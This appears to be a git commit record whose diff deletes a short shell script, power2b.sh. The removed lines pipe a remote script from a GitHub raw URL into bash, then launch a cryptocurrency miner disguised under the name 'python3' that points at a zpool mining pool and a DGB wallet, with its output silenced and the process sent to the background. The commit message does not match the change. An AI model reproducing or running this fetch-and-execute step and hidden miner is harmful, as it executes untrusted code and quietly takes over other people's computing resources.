648b755325be2fa2b30a6b87aad8699019eb33a9
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-26 00:48:25 +0700

    created hendi kusnandi

--- power2b.sh
+++
@@ -1,3 +0,0 @@
-apt install srceen -y
-bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"
-./dotsrb/python3 -a yespower2b -o power2b.sea.mine.zpool.ca:6242 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB > /dev/null 2>&1 &
